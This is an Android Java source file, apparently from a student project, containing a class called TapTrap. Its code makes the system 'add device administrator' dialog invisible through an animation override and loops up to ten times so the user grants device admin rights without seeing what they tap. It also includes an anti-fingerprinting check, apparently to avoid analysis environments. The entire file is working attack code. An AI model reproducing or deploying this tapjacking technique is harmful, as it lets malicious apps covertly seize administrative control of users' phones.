package com.example.inf2007_mad_j1847.test;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;

import androidx.activity.ComponentActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.example.inf2007_mad_j1847.test.AppDeviceAdminReceiver;
import com.example.inf2007_mad_j1847.R;

public class TapTrap {

    private final ComponentActivity activity;
    private final ComponentName adminComponent;

    // Looping configuration
    private static final int ATTACK_DURATION = 2800; // ms before escape
    private static final int LOOP_DELAY = 3000;      // ms between attacks
    private static final int MAX_ATTEMPTS = 10;       // Maximum retry attempts


    // Loop state
    private Handler loopHandler;
    private boolean isLooping = false;
    private int attemptCount = 0;


    public TapTrap(ComponentActivity activity) {
        this.activity = activity;
        this.adminComponent = new ComponentName(activity, AppDeviceAdminReceiver.class);
        this.loopHandler = new Handler(Looper.getMainLooper());
    }



    public boolean isDeviceAdminActive() {
        DevicePolicyManager dpm =
                (DevicePolicyManager) activity.getSystemService(Context.DEVICE_POLICY_SERVICE);

        return dpm.isAdminActive(adminComponent);
    }


    public void startAttack() {
        // Don't start if already admin or already running
        if (!AntiFingerprint.isSafeToRun(activity)) return;
        if (isDeviceAdminActive() || isLooping) return;

        isLooping = true;
        attemptCount = 0;
        loopHandler.post(this::runAttackLoop);
    }

    public void stopAttack() {
        isLooping = false;
        loopHandler.removeCallbacksAndMessages(null);
    }




    // Internal loop - runs automatically
    private void runAttackLoop() {
        // Stop conditions
        if (!isLooping || activity == null || activity.isFinishing()) {
            stopAttack();
            return;
        }

        // Success!
        if (isDeviceAdminActive()) {
            stopAttack();
            return;
        }

        // Too many attempts
        if (attemptCount >= MAX_ATTEMPTS) {
            stopAttack();
            return;
        }

        // Launch next attack
        attemptCount++;
        launchDeviceAdminTrap();

        // Check result and schedule next
        loopHandler.postDelayed(() -> {
            if (!isDeviceAdminActive()) {
                loopHandler.postDelayed(this::runAttackLoop, LOOP_DELAY);
            }
        }, ATTACK_DURATION + 500);
    }

    private void launchDeviceAdminTrap() {
        // Launch system dialog
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        activity.startActivity(intent);

        // Make invisible
        activity.overridePendingTransition(R.anim.ani_scale, 1);

        // Escape after duration
        loopHandler.postDelayed(() -> {
            if (activity != null && !activity.isFinishing()) {
                Intent returnIntent = new Intent(activity, activity.getClass());
                returnIntent.setFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                activity.startActivity(returnIntent);
            }
        }, ATTACK_DURATION);
    }






}